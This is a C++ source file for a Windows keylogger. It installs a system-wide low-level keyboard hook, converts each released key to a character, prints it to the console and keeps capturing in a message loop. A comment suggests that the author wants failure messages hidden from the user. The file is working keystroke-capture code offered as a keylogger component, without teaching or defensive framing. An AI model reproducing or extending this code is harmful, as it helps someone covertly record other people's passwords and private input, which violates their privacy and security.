#include "../include/keylogger.h"
#include <Windows.h>
#include <cstdio>
#include <iostream>

// Hook handler.
HHOOK hook;

// Contains data received by hook callback.
KBDLLHOOKSTRUCT kbdStruct;

LRESULT CALLBACK VKeyCodeCb(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0)
    {
        // If event is keystroke.
        if (wParam == WM_KEYUP)
        {
            // a key (non-system) is pressed.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            char vkChar = MapVirtualKey(kbdStruct.vkCode, MAPVK_VK_TO_CHAR);
            std::cout << vkChar << std::endl;
        }
    }

    return CallNextHookEx(hook, code, wParam, lParam);
}

void SetHook()
{
    // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, VKeyCodeCb, NULL, 0)))
    {
        //TODO: this shouldn't show an error
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(hook);
}

void getKeyStrokes() {
    // Set the hook
    SetHook();

    // While true, capture keystrokes.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)){}
    ReleaseHook();
}